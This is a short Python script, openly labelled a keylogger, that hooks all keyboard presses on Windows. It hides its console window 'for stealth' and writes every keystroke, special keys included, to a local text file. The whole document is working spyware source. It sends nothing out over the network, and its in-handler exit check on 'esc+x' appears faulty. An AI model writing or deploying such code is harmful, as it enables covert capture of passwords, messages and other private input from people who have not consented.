
import keyboard  # Modern library for keyboard events
from os import _exit

# Hide the console window (optional, for stealth)
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# File path to store the keylogs
file_path = r"C:\Users\sumed\output.txt"

# Function to handle key events
def on_key_event(event):
    try:
        # Exit condition (ESC key)
        if event.name == 'esc+x':
            print("Exiting keylogger...")
            _exit(0)

        # Open file in append mode
        with open(file_path, "a") as file:
            # Handle special keys and write them line by line
            if event.name == "enter":
                file.write("\n[ENTER]\n")  # Add a newline
            elif event.name == "space":
                file.write("\n[SPACE]\n")  # Log "space" on a new line
            elif len(event.name) == 1:  # Normal keys
                file.write(f"{event.name}\n")  # Write keys vertically
            else:  # Special keys like shift, ctrl, etc.
                file.write(f"\n[{event.name.upper()}]\n")
    except Exception as e:
        print(f"Error: {e}")

# Hook all keyboard events
keyboard.on_press(on_key_event)

# Wait indefinitely for keyboard events
print("Keylogger is running... Press ESC+x to exit.")
keyboard.wait('esc+x')  # Wait until the ESC+x key is pressed